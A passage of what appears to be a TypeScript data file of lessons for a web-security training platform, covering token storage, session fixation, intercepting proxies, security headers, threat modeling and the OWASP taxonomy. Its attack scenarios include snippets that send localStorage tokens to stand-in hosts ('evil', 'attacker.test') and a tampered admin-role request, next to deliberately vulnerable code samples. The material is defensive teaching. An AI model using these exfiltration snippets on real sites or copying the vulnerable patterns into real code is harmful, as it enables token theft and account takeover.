      { title: 'OWASP ASVS V3.4: Cookie-based Session Management', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
      { title: 'OWASP Session Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html' },
    ],
    keyTakeaways:
      '• `HttpOnly` blocks JS (`document.cookie`) theft during XSS.\n• `Secure` restricts transmission strictly to encrypted HTTPS.\n• `SameSite=Lax` or `Strict` blocks cross-site CSRF writes.\n• Omit `Domain` (host-only) and use the `__Host-` prefix on HTTPS to block subdomain cookie tossing.',
  },

  // -------------------------------------------------------------------------
  // 8. Browser Storage & Session Lifecycle Architecture
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'browser-storage-session-basics-lab',
    title: 'Browser Storage & Session Architecture: Cookies vs localStorage vs sessionStorage',
    slug: 'foundations-browser-storage-sessions',
    description:
      'Stop guessing where to store authentication tokens! Learn the exact security differences between HttpOnly Cookies, localStorage, sessionStorage, and memory—plus Session Fixation and server-side logout.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP A07:2021 / OWASP ASVS V3 (Session Management)',
    cweReference: 'CWE-384: Session Fixation / CWE-922: Insecure Storage',
    cvssScore: 7.3,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'Modern SPAs (React, Vite) and APIs give developers several places inside the browser to keep state: **Cookies**, **`localStorage`**, **`sessionStorage`**, and **JavaScript Memory**. Choosing the wrong one turns minor third-party script issues into complete account takeovers:\n\n1. **`HttpOnly` Cookies**: Stored by browser, sent automatically per matching domain. **Immune to JS reading** (`document.cookie` cannot touch them), though they require CSRF protection (`SameSite` + CSRF tokens).\n2. **`localStorage`**: Persistent per-origin key-value store (~5MB), survives browser restarts. **Any JavaScript on your origin** (including any XSS bug or compromised analytics/chat widget!) can run `localStorage.getItem("token")`!\n3. **`sessionStorage`**: Cleared when tab closes, isolated per tab, but **still 100% readable by JavaScript** on that tab.\n4. **In-Memory JS State**: Lost on full page refresh (often paired with an `HttpOnly` refresh cookie).',
    rootCause:
      'Teams frequently dump long-lived JWTs or Admin tokens into `localStorage` for convenience, exposing every user token to any single XSS flaw or malicious npm/CDN dependency. Additionally, apps often skip regenerating session IDs upon login (allowing **Session Fixation**) or implement "client-only logout" (`localStorage.removeItem("token")`) without revoking tokens on the server!',
    mechanics:
      'Three critical Session Lifecycle rules (OWASP ASVS V3):\n1. **Token Storage Exposure**: If an app stores `accessToken` in `localStorage`, a tiny XSS (`fetch("https://evil/?t=" + localStorage.token)`) exfiltrates permanent account access directly—even if the attacker never uses the user’s browser again.\n2. **Session Fixation (CWE-384)**: An unauthenticated user visits a site and receives `session=guest_111`. If an attacker tricks the victim into authenticating WITH `session=guest_111` (and the server reuses the same ID instead of creating a brand-new random one upon login), the attacker immediately owns the newly authenticated session!\n3. **Broken Logout (CWE-613)**: Deleting a cookie/token only inside React (`localStorage.clear()`) does NOT kill the JWT or server session if an attacker already copied it! True logout MUST invalidate the session record or token ID (`jti`) on the server (Redis/DB).',
    attackScenario:
      '// 1. Why localStorage tokens are easily stolen when ANY XSS or compromised script runs:\nconst stolen = Object.entries(localStorage);\nnavigator.sendBeacon("https://attacker.test/collect", JSON.stringify(stolen));\n\n// 2. Broken Client-Side-Only Logout Check:\n// Step A: Logged-in token copied via proxy: Authorization: Bearer eyJhbGci...\n// Step B: User clicks "Logout" -> Frontend deletes localStorage token\n// Step C: Attacker replays Authorization: Bearer eyJhbGci... -> Server STILL returns 200 OK!',
    securityImpact:
      'Persistent account takeover after XSS or third-party script compromise, session hijacking after users believe they logged out (shared/public computers), and privilege hijacking via Session Fixation.',
    prevention:
      '1. Prefer **HttpOnly + Secure + SameSite** cookies for session tokens and refresh tokens rather than `localStorage` (ASVS V3.4).\n2. Never store PII, passwords, encryption keys, or admin secrets in `localStorage` or `sessionStorage`.\n3. Always **rotate/regenerate** session identifiers upon authentication, MFA completion, or privilege changes (blocks Session Fixation).\n4. Enforce both **idle timeout** (e.g., 30 min inactivity) and **absolute session timeout** (e.g., 12–24 hours), plus immediate server-side revocation in Redis/MySQL on logout or password change (ASVS V3.3).',
    vulnerableCode: `// VULNERABLE: Stores long-lived auth token in localStorage & fakes logout client-side
export function saveSession(token: string) {
  // Accessible to ANY XSS payload or compromised third-party analytics script!
  localStorage.setItem('auth_token', token);
}

export function logoutUser() {
  // Token remains valid on the backend if captured beforehand!
  localStorage.removeItem('auth_token');
}`,
    secureCode: `// SECURE: Backend issues HttpOnly cookie, rotates session on login, revokes on logout
// Backend login handler:
app.post('/api/auth/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  // Rotate/create brand-new high-entropy session ID (>= 128 bits)
  const newSessionId = crypto.randomBytes(32).toString('hex');
  await redis.set(\`sess:\${newSessionId}\`, JSON.stringify({ userId: user.id }), 'EX', 3600);
  res.cookie('__Host-sid', newSessionId, { httpOnly: true, secure: true, sameSite: 'lax', path: '/' });
  res.json({ ok: true });
});

// Backend logout handler:
app.post('/api/auth/logout', async (req, res) => {
  const sid = req.cookies['__Host-sid'];
  if (sid) await redis.del(\`sess:\${sid}\`); // Immediately dead server-side!
  res.clearCookie('__Host-sid', { path: '/' });
  res.json({ ok: true });
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'Supply-chain attacks like Magecart / Polyfill.io compromises injected tiny obfuscated scripts into thousands of sites; sites storing JWTs or payment tokens in `localStorage` saw full session harvesting across every visitor without tripping any server alarm.',
    references: [
      { title: 'OWASP HTML5 Security Cheat Sheet (Web Storage)', url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html' },
      { title: 'OWASP ASVS V3: Session Management Requirements', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
      { title: 'CWE-384: Session Fixation', url: 'https://cwe.mitre.org/data/definitions/384.html' },
    ],
    keyTakeaways:
      '• Anything in `localStorage` or `sessionStorage` is readable by ANY JavaScript on that origin—never store sensitive session tokens there.\n• Always regenerate session IDs after login (stops Session Fixation).\n• Logout MUST destroy the session/token on the server (Redis/DB), not just delete it in the browser.',
  },

  // -------------------------------------------------------------------------
  // 9. Web Proxies & Request Interception
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'web-proxy-interception-lab',
    title: 'Web Proxies, TLS Interception & Client-Trust Boundaries (NIST SP 800-95)',
    slug: 'foundations-web-proxies-interception',
    description:
      'Understand how security testers intercept and edit live HTTPS requests using Burp Suite, OWASP ZAP, or mitmproxy—and why HTML disabled buttons and frontend validation never protect your backend.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP A04:2021 – Insecure Design / NIST SP 800-95',
    cweReference: 'CWE-602: Client-Side Enforcement of Server-Side Security',
    cvssScore: 8.6,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'How do penetration testers catch bugs that normal clicking never reveals? They sit between the browser and the web server using an **Intercepting Web Proxy** (such as **Burp Suite**, **OWASP ZAP**, or **mitmproxy**).\n\nThink of an intercepting proxy like a pause-and-edit DVR for HTTP traffic:\n1. You configure your browser to route traffic through `127.0.0.1:8080`.\n2. When you click "Checkout $50", your browser runs all its HTML `<input max="10">`, React validation, and `disabled` checks—and then mails the raw HTTP POST request to the proxy.\n3. The proxy **freezes the request before it hits the internet**, letting the tester edit ANY byte (change `"price": 50` to `"price": 0.01`, add `"role": "ADMIN"`, swap `X-Forwarded-For: 127.0.0.1`), and then click Forward!\n\nThat leads to Web Security Law #1: **Frontend validation is ONLY for user experience—EVERY security check must happen on the server!**',
    rootCause:
      'Developers mistakenly treat the user’s browser as a trusted extension of their server—hiding admin buttons with CSS (`display: none`), checking prices/roles inside React before calling `fetch()`, trusting hidden form inputs (`<input type="hidden" name="discount" value="0">`), or trusting spoofable client headers (`X-Forwarded-For`, `Referer`, `User-Agent`).',
    mechanics:
      '1. How HTTPS Interception Works (`HTTP CONNECT` + Local Root CA):\n   • Normally, TLS prevents anyone in the middle from reading HTTPS traffic. How can Burp/ZAP see inside HTTPS? By acting as an authorized MITM proxy!\n   • Your browser sends `CONNECT api.target.local:443 HTTP/1.1` to the proxy.\n   • The proxy dynamically generates a certificate for `api.target.local` signed by its own **Proxy Root CA**, which YOU explicitly installed into your test browser’s trust store.\n   • Traffic encrypts browser <-> proxy (Proxy CA) and separately proxy <-> server (real cert), letting you inspect and modify requests cleanly inside your lab!\n2. Proxy Repeater & Intruder Workflows:\n   • **Intercept / Breakpoint**: Pause one request mid-flight to tweak parameters.\n   • **Repeater**: Resend the same modified HTTP request 50 times cleanly without touching the UI.\n   • **Fuzzing / Intruder**: Automatically test wordlists for IDOR IDs, missing auth, or injection characters.\n3. Common Tampered Parameters:\n   • Hidden fields & JSON bodies (`role`, `isAdmin`, `price`, `quantity`)\n   • Headers (`X-Forwarded-For`, `X-Original-URL`, `Host`, `Origin`)\n   • Cookies (`role=user` -> `role=admin` when unsigned)',
    attackScenario:
      '# Victim UI disables the Admin button & sends only {"plan": "free", "price": 0}:\n# Attacker pauses POST request in Burp/ZAP Proxy and edits JSON directly on the wire:\n\nPOST /api/v1/billing/subscribe HTTP/1.1\nHost: portal.websec.local\nContent-Type: application/json\nCookie: __Host-sid=valid_user_session\n\n{\n  "plan": "enterprise",\n  "price": 0,\n  "role": "ADMIN"   <-- Added directly in Proxy Repeater!\n}',
    securityImpact:
      'Total bypass of business logic (free purchases, negative quantities), horizontal/vertical privilege escalation (`role: "ADMIN"` mass assignment), rate-limit evasion via header spoofing, and authorization bypass.',
    prevention:
      '1. Enforce **NIST SP 800-95 Zero Client Trust**: Never compute prices, discounts, user identity, permissions, or account balance from client-supplied payloads—look them up directly from your database using the server-verified session/JWT.\n2. Use strict DTO allowlists (e.g., NestJS `ValidationPipe` with `whitelist: true, forbidNonWhitelisted: true`) so unexpected properties like `role` or `isAdmin` are automatically rejected.\n3. Do not trust `X-Forwarded-For` or `X-Real-IP` unless configured strictly via trusted reverse proxy hops (`app.set("trust proxy", 1)`).\n4. Re-validate all permissions server-side on every single API endpoint, even if a button is hidden in React.',
    vulnerableCode: `// VULNERABLE: Trusts price and role inside incoming HTTP request body
app.post('/api/orders/checkout', authenticate, async (req, res) => {
  // Attacker intercepts request in Burp Suite and changes price to 0.01!
  const { productId, unitPrice, quantity, overrideRole } = req.body;
  const total = unitPrice * quantity;
  await db.createOrder({ userId: req.user.id, productId, total, role: overrideRole });
  res.json({ charged: total });
});`,
    secureCode: `// SECURE: Ignores client price/role; fetches authoritative price from DB + strict DTO
app.post('/api/orders/checkout', authenticate, async (req, res) => {
  const { productId, quantity } = req.body;
  if (!Number.isInteger(quantity) || quantity < 1 || quantity > 100) {
    return res.status(400).json({ error: 'Invalid quantity' });
  }
  const product = await db.findProductById(productId);
  if (!product) return res.status(404).json({ error: 'Product not found' });

  // Server calculates authoritative price directly from DB—proxy tampering has zero effect!
  const authoritativeTotal = product.priceCents * quantity;
  await db.createOrder({ userId: req.user.id, productId: product.id, total: authoritativeTotal });
  res.status(201).json({ chargedCents: authoritativeTotal });
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'Numerous e-commerce platforms lost thousands in inventory before adding server-side price recalculation because shoppers used browser proxies to rewrite hidden `amount=99.00` parameters into `amount=0.01` right before payment gateway submission.',
    references: [
      { title: 'NIST SP 800-95: Guide to Secure Web Services', url: 'https://csrc.nist.gov/pubs/sp/800/95/final' },
      { title: 'OWASP WSTG: Testing for Client-Side Bypass', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
      { title: 'CWE-602: Client-Side Enforcement of Server Security', url: 'https://cwe.mitre.org/data/definitions/602.html' },
    ],
    keyTakeaways:
      '• Intercepting proxies decrypt HTTPS via `HTTP CONNECT` + a trusted local Proxy Root CA so pentesters can edit every request byte.\n• Frontend JS checks, `disabled` buttons, and `<input type="hidden">` do NOT enforce security.\n• Always compute prices, permissions, and identity strictly on the backend with strict DTO allowlists.',
  },

  // -------------------------------------------------------------------------
  // 10. HTTP Security Headers & Defense-in-Depth (OWASP ASVS V14)
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'tls-https-transport-basics-lab',
    title: 'TLS, HTTPS, HSTS & Browser Security Headers (CSP, Frame-Ancestors, nosniff)',
    slug: 'foundations-security-headers-defense',
    description:
      'Understand how HTTPS/TLS encryption works, why HSTS stops Wi-Fi SSL stripping, and how 5–6 HTTP response headers switch on browser shields against XSS execution and Clickjacking.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP A02:2021 & A05:2021 / OWASP ASVS V14.4 & NIST SP 800-95',
    cweReference: 'CWE-693: Protection Mechanism Failure',
    cvssScore: 6.1,
    status: ChallengeStatus.PUBLISHED,
    overview:
      `Even careful developers occasionally ship bugs. That is why cybersecurity follows **Defense-in-Depth** (NIST SP 800-95 & OWASP ASVS V14): wrapping your app in multiple independent layers so if one layer slips, another stops the exploit!

Modern web browsers ship with built-in security armor—but servers MUST activate those shields via **HTTP Security Response Headers**:
• **Content-Security-Policy (CSP)**: Tells the browser strictly WHICH scripts, styles, images, and API endpoints are allowed to execute—neutering most XSS payloads!
• **frame-ancestors 'none' / X-Frame-Options: DENY**: Stops **Clickjacking** (an attacker disguising your "Transfer Money" button beneath an invisible <iframe>).
• **Strict-Transport-Security (HSTS)**: Locks connections to HTTPS.
• **X-Content-Type-Options: nosniff**: Stops browsers from guessing wrong file types.
• **Referrer-Policy: strict-origin-when-cross-origin**: Prevents secret URLs/tokens from leaking to external websites in Referer headers.
• **Cache-Control: no-store**: Stops browsers or shared proxies from caching private banking/admin responses.`,
    rootCause:
      'Default web frameworks rarely ship strict CSP or anti-clickjacking policies out of the box, or developers use weak copy-pasted CSPs like `script-src \'self\' \'unsafe-inline\' *`—where `\'unsafe-inline\'` completely cancels XSS script protection!',
    mechanics:
      '1. **How CSP Neutralizes XSS**: Suppose an attacker manages to inject `<script>stealTokens()</script>` or `<script src="https://evil.test/x.js">` into HTML. If the server sends `Content-Security-Policy: default-src \'self\'; script-src \'self\'; object-src \'none\'; base-uri \'self\'`, the browser **refuses to run inline `<script>` tags OR external evil scripts** and logs a violation report!\n2. **How Clickjacking Works & Fails**: An attacker overlays your `<iframe src="https://bank.com/delete-account">` at `opacity: 0.01` right under a fake "Claim Free Prize!" button. Sending `Content-Security-Policy: frame-ancestors \'none\'` blocks ANY site from framing your pages.\n3. **Why `Cache-Control: no-store` Matters**: On shared lab/kiosk computers, hitting the browser Back button after logout can still display cached confidential API JSON or HTML if `no-store` is missing.',
    attackScenario:
      '# Auditing Missing Security Headers on a Target Server:\ncurl -I https://portal.websec.local/account\n\n# INSECURE RESPONSE HEADERS:\nHTTP/1.1 200 OK\nContent-Type: text/html\n# Missing Content-Security-Policy -> Inline XSS runs unchecked & site can be framed (Clickjacking!)\n# Missing X-Content-Type-Options: nosniff -> Uploaded .txt can be sniffed as HTML/JS\n# Missing Cache-Control: no-store -> Shared PC caches private page on disk\n\n# SECURE BASELINE HEADERS (ASVS V14.4):\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Security-Policy: default-src \'self\'; script-src \'self\'; object-src \'none\'; base-uri \'self\'; frame-ancestors \'none\'\nX-Content-Type-Options: nosniff\nReferrer-Policy: strict-origin-when-cross-origin\nCache-Control: no-store',
    securityImpact:
      'Lack of defense-in-depth headers escalates minor HTML/file-upload flaws into full XSS account compromise, enables seamless Clickjacking attacks on sensitive actions, leaks secret URLs via `Referer`, and leaves private user screens cached on shared systems.',
    prevention:
      '1. Enable baseline headers globally using framework middleware (e.g., `helmet()` in Express/NestJS or Nginx `add_header`).\n2. Craft a strict `Content-Security-Policy`—avoid `\'unsafe-inline\'` and `\'unsafe-eval\'` in `script-src`; use cryptographic nonces or hashes when inline scripts are necessary.\n3. Prevent Clickjacking with `frame-ancestors \'none\'` (or `\'self\'`) in CSP plus `X-Frame-Options: DENY` for legacy support.\n4. Set `Cache-Control: no-store` on all authenticated API and account endpoints.\n5. Continuously test header posture using OWASP WSTG-CONF-12 and automated CI checks.',
    vulnerableCode: `// VULNERABLE: Default server without Helmet / CSP / anti-clickjacking / nosniff
const app = express();
app.get('/api/profile', authenticate, (req, res) => {
  // No CSP, no X-Frame-Options, no nosniff, and browser may cache private JSON!
  res.json(req.user);
});`,
    secureCode: `// SECURE: Defense-in-depth HTTP security headers aligned with OWASP ASVS V14.4
import helmet from 'helmet';

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        frameAncestors: ["'none'"],
      },
    },
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    hsts: { maxAge: 31536000, includeSubDomains: true },
  })
);

app.use('/api', (_req, res, next) => {
  res.setHeader('Cache-Control', 'no-store');
  next();
});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'GitHub dramatically reduced XSS exploitability after migrating to a strict `Content-Security-Policy` that banned inline scripts and locked `object-src \'none\'`—even when rare HTML parsing bugs appeared, CSP prevented malicious scripts from executing.',
    references: [
      { title: 'OWASP HTTP Security Response Headers Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html' },
      { title: 'OWASP ASVS V14.4: HTTP Security Headers', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
      { title: 'OWASP Content Security Policy Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html' },
    ],
    keyTakeaways:
      '• Security headers activate built-in browser armor (`CSP`, `HSTS`, `nosniff`, `frame-ancestors`).\n• `script-src \'self\'` without `\'unsafe-inline\'` blocks injected XSS execution.\n• `frame-ancestors \'none\'` defeats Clickjacking, and `Cache-Control: no-store` protects sensitive pages on shared devices.',
  },

  // -------------------------------------------------------------------------
  // 11 (9th Foundations Lesson). Threat Modeling & OWASP ASVS V1
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'owasp-threat-modeling-a00-lab',
    title: 'Web Threat Modeling, Trust Boundaries & OWASP ASVS V1 Architecture',
    slug: 'foundations-threat-modeling-asvs-v1',
    description:
      'Learn how to spot vulnerabilities BEFORE writing code using Adam Shostack’s 4 Questions, Trust Boundaries, STRIDE threats, and OWASP ASVS V1 architectural verification.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP ASVS V1 (Architecture & Threat Modeling) / NIST SP 800-95',
    cweReference: 'CWE-1053: Missing Security Design / Architectural Flaw',
    cvssScore: 7.0,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'What is **Threat Modeling**? In plain English, it means thinking like a careful architect + friendly hacker **before** you build or deploy a feature—so you catch design flaws early when they cost 10x less to fix!\n\nFollow Adam Shostack’s **4 Simple Questions** (recommended by OWASP ASVS V1):\n1. **What are we working on?** Draw a quick Data Flow Diagram (DFD) showing Browser -> Load Balancer -> Backend API -> Database/Redis, and draw dotted red lines called **Trust Boundaries** wherever data crosses from untrusted to trusted (e.g., Internet -> API, Normal User -> Admin Panel).\n2. **What can go wrong?** Walk each Trust Boundary using **STRIDE**:\n   • **S**poofing (Can someone pretend to be another user?)\n   • **T**ampering (Can someone edit price/IDs in transit?)\n   • **R**epudiation (Can someone say "Wasn’t me!" due to missing audit logs?)\n   • **I**nformation Disclosure (Can someone read private records or stack traces?)\n   • **D**enial of Service (Can someone flood an expensive endpoint with 10k reqs/sec?)\n   • **E**levation of Privilege (Can a normal user trigger admin actions?)\n3. **What are we going to do about it?** Pick concrete controls (Authentication, Server Validation, Rate Limiting, Encryption).\n4. **Did we do a good job?** Write automated tests & run pentests against those exact threats!',
    rootCause:
      'Pure code scanners (SAST) catch syntax bugs like SQL concatenation, yet completely miss **Architectural / Insecure Design Flaws (OWASP A04:2021)**—such as password reset flows with 4-digit OTPs and no rate limit, multi-step checkouts that forget to verify payment completion, or challenge containers sharing access to the host Docker socket or production MySQL network!',
    mechanics:
      'Let’s threat-model a WebSec CTF Platform **Flag Submission & Lab Launch** flow using Trust Boundaries + ASVS V1:\n• **Trust Boundary 1 (Browser -> NestJS API)**:\n  - *Spoofing*: Weak JWT or forged cookie -> Control: Signed JWT + `HttpOnly` cookie / AuthGuard.\n  - *Tampering*: Client sends `{"points": 5000}` -> Control: Reject client points; award points solely from server DB challenge record.\n  - *DoS*: Brute-forcing `WEBSEC{...}` 100,000 times/sec -> Control: Per-user + per-IP rate limiting (ASVS V1.11).\n• **Trust Boundary 2 (Vulnerable Lab Container -> Production DB / Host)**:\n  - *Elevation of Privilege / Lateral Movement*: Intentionally vulnerable SSRF or RCE lab tries to read production MySQL (`3306`) or cloud metadata (`169.254.169.254`) -> Control: Isolated Docker bridge network, no host Docker socket mount, read-only rootfs, memory/CPU limits, server-side per-instance flag hashing!',
    attackScenario:
      '# Example Design Flaw Caught Only by Threat Modeling (No SQLi/XSS syntax bug!):\n# Flow: User triggers Password Reset -> Receives 4-digit PIN (0000-9999) via Email -> POST /verify-pin\n\n# STRIDE Analysis across Boundary (Browser -> Auth API):\n# - Threat (Spoofing / Brute Force): Only 10,000 possible PINs!\n# - If rate limit is missing or locks per-IP header (X-Forwarded-For), attacker tests 0000..9999 in 30 seconds!\n# - Mitigation from Threat Model:\n#   1. Use 32-byte cryptographically random reset token (2^256 entropy), NOT 4 digits.\n#   2. Expire token in 15 minutes & invalidate immediately after first use (ASVS V2.5).\n#   3. Rate limit per account AND log all reset failures (stops Repudiation).',
    securityImpact:
      'Skipping Threat Modeling produces systemic design vulnerabilities (OWASP A04:2021) that cannot be patched by tiny input sanitization fixes—requiring expensive architecture rewrites after production breaches.',
    prevention:
      '1. Adopt **OWASP ASVS V1 (Architecture, Design & Threat Modeling)** at design kickoff for every new module (auth, payments, uploads, AI/webhooks).\n2. Diagram every **Trust Boundary**—treat all data crossing a boundary as hostile until validated.\n3. Run a 20-minute **STRIDE checklist** across each boundary for every high-risk feature.\n4. Enforce security-by-default isolation (least privilege DB accounts, network segmentation between labs and production DB, server-side flag/price state).\n5. Verify threat mitigations with negative automated tests (e.g., assert `USER` role receives `403` on admin endpoints).',
    vulnerableCode: `// INSECURE DESIGN (Passes syntax & type checks, fails Threat Modeling!):\n// Design flaw 1: Predictable 4-digit password reset code with zero rate limit\napp.post('/api/auth/request-reset', async (req, res) => {\n  const pin = Math.floor(1000 + Math.random() * 9000).toString(); // Only 9,000 guesses!\n  await db.saveResetCode(req.body.email, pin);\n  res.json({ sent: true });\n});`,
    secureCode: `// SECURE DESIGN (Built after STRIDE + OWASP ASVS V1/V2 review):\nimport * as crypto from 'crypto';\n\napp.post('/api/auth/request-reset', rateLimitStrict, async (req, res) => {\n  // 1. 256-bit CSPRNG token (unpredictable, immune to brute force)\n  const rawToken = crypto.randomBytes(32).toString('hex');\n  // 2. Store ONLY SHA-256 hash in DB so even a DB read leak cannot use active tokens\n  const tokenHash = crypto.createHash('sha256').update(rawToken).digest('hex');\n  await db.saveHashedResetToken(req.body.email, tokenHash, Date.now() + 15 * 60_000);\n  // 3. Always return identical generic message (prevents Account Enumeration)\n  res.json({ message: 'If that email exists, a reset link has been sent.' });\n});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'During architectural reviews of modern cloud platforms, SSRF vulnerabilities accessing cloud instance metadata (`http://169.254.169.254`) were only systematically eliminated once AWS introduced IMDSv2 (session token + hop limit)—a direct architectural fix born from threat modeling trust boundaries.',
    references: [
      { title: 'OWASP Threat Modeling Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html' },
      { title: 'OWASP ASVS V1: Architecture & Threat Modeling', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
      { title: 'NIST SP 800-95: Web Service Security Architecture', url: 'https://csrc.nist.gov/pubs/sp/800/95/final' },
    ],
    keyTakeaways:
      '• Ask Shostack’s 4 Questions before coding: What are we building? What can go wrong (STRIDE)? How do we fix it? Did we test it?\n• Identify **Trust Boundaries**—never trust data crossing from Browser -> API or Lab Container -> Core Infrastructure.\n• Design bugs (OWASP A04) require architectural fixes, not just regex filters.',
  },

  // -------------------------------------------------------------------------
  // 12 (10th Foundations Lesson). OWASP Top 10 A00:2021, CWE, CVSS & Standards Map
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'owasp-top10-taxonomy-lab',
    title: 'OWASP Top 10 (A00:2021–A10), CWE, CVE, CVSS & NIST SP 800-95 Map',
    slug: 'foundations-owasp-top10-taxonomy',
    description:
      'Your complete beginner-friendly dictionary connecting every major global security standard: OWASP Top 10 (A00:2021), OWASP WSTG, OWASP ASVS, CWE, CVE, CVSS v3.1 scores, and NIST SP 800-95.',
    category: 'Foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP A00:2021 – Introduction & Global Standards Map',
    cweReference: 'CWE-1000: Research Concepts & Taxonomy Mapping',
    cvssScore: 5.0,
    status: ChallengeStatus.PUBLISHED,
    overview:
      'When you read a security report or a WebSec CTF challenge card, you see badges like **`OWASP A01:2021`**, **`CWE-89`**, **`CVSS 9.8`**, **`WSTG-INPV-05`**, **`ASVS V1`**, **`RFC 6265`**, and **`NIST SP 800-95`**. How do they fit together? Here is the easiest mental map:\n\n• **OWASP Top 10:2021 (`A00`–`A10`)** = The **10 Big Risk Categories** of web security (`A00:2021` is the Introduction & Taxonomy). Think of these as chapters in a textbook: A01 Broken Access Control, A02 Crypto Failures, A03 Injection, etc.\n• **CWE (Common Weakness Enumeration)** = The **Exact Coding Mistake Pattern** (e.g., `CWE-79` XSS, `CWE-89` SQL Injection, `CWE-639` IDOR). One OWASP category groups many CWEs!\n• **CVE (Common Vulnerabilities & Exposures)** = One **Specific Disclosed Bug** in a real product version (e.g., `CVE-2021-44228` Log4Shell).\n• **CVSS v3.1 (`0.0`–`10.0`)** = The **Severity Thermometer** scoring how easy and damaging an exploit is (Low `0.1–3.9`, Medium `4.0–6.9`, High `7.0–8.9`, Critical `9.0–10.0`).\n• **OWASP ASVS** = **Developer Verification Standard** ("Checklists to build/verify apps securely": L1 Basic, L2 Standard, L3 Critical).\n• **OWASP WSTG v4.2** = **Tester’s Playbook** ("Step-by-step how pentesters test each flaw").\n• **NIST SP 800-95 & IETF RFCs** = **Government Architecture & Exact Internet Protocol Rules**.',
    rootCause:
      'Beginners and engineering teams often treat OWASP Top 10 as a "complete security checklist" (`If we passed A01..A10, we are 100% secure!`)—which OWASP A00:2021 explicitly warns against! OWASP Top 10 highlights only the *10 highest-awareness risks*; comprehensive engineering assurance requires **OWASP ASVS**, **CWE root-cause mapping**, and **CVSS risk prioritization**.',
    mechanics:
      '1. **Reading a Real OWASP Top 10:2021 Entry (`A00:2021` Introduction)**:\n   • **A01:2021 – Broken Access Control** (#1 risk! Includes IDOR, privilege escalation, CORS misconfig, JWT authz bypass).\n   • **A02:2021 – Cryptographic Failures** (Plaintext HTTP, weak hashes like MD5/SHA1 for passwords, hardcoded keys).\n   • **A03:2021 – Injection** (SQLi, XSS, Command Injection, SSTI).\n   • **A04:2021 – Insecure Design** (Missing threat models, race conditions, unsafe workflows).\n   • **A05:2021 – Security Misconfiguration** (Default passwords, open cloud buckets, stack traces, missing security headers).\n   • **A06:2021 – Vulnerable & Outdated Components** (Old unpatched npm/Maven packages).\n   • **A07:2021 – Identification & Authentication Failures** (Brute force, weak sessions, missing `HttpOnly`/`Secure`).\n   • **A08:2021 – Software & Data Integrity Failures** (Insecure Deserialization, unsigned CI/CD updates).\n   • **A09:2021 – Security Logging & Monitoring Failures** (No alerts on attack attempts).\n   • **A10:2021 – Server-Side Request Forgery (SSRF)** (Forcing server to fetch internal URLs).\n2. **Decoding a CVSS v3.1 Vector**:\n   `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 CRITICAL**\n   • `AV:N` (Attack Vector: Network — exploitable remotely over the internet!)\n   • `AC:L` (Attack Complexity: Low — reliable, no race condition needed)\n   • `PR:N` (Privileges Required: None — unauthenticated attacker!)\n   • `UI:N` (User Interaction: None — victim doesn’t even need to click!)\n   • `C:H/I:H/A:H` (High Confidentiality, Integrity & Availability impact).',
    attackScenario:
      '# Example Risk Triage Comparison (Why CVSS + Context Prioritize Fixes):\n\nFinding A: Unauthenticated SQL Injection on Public Search\n- OWASP: A03:2021 Injection | CWE: CWE-89 | WSTG: WSTG-INPV-05\n- CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H -> Score 9.8 (CRITICAL) -> Fix IMMEDIATELY!\n\nFinding B: Verbose Server Banner Header ("X-Powered-By: Express")\n- OWASP: A05:2021 Security Misconfiguration | CWE: CWE-200 | WSTG: WSTG-INFO-02\n- CVSS: 0.0–3.7 (INFO/LOW) -> Fix in normal hardening sprint.\n\n# Notice how CWE tells devs HOW to fix the code, OWASP classifies risk, and WSTG tells QA how to test it!',
    securityImpact:
      'Misunderstanding severity ratings or confusing awareness frameworks (OWASP Top 10) with engineering verification standards (OWASP ASVS) causes teams to waste hours fixing low-impact headers while unauthenticated Critical bugs remain exposed.',
    prevention:
      '1. Use **OWASP Top 10:2021 (A00–A10)** for executive awareness and high-level categorization.\n2. Use **OWASP ASVS** (Level 1 for all apps, Level 2 for business/PII apps) as your actual developer & QA checklist.\n3. Tag every bug in issue trackers with its exact **CWE ID** so recurring root weaknesses (e.g., repeated CWE-79 XSS) trigger framework-wide fixes.\n4. Score findings consistently using **CVSS v3.1** combined with real asset sensitivity and NIST SP 800-95 architectural controls.\n5. Verify fixes before shipping using the **OWASP WSTG v4.2** test procedures.',
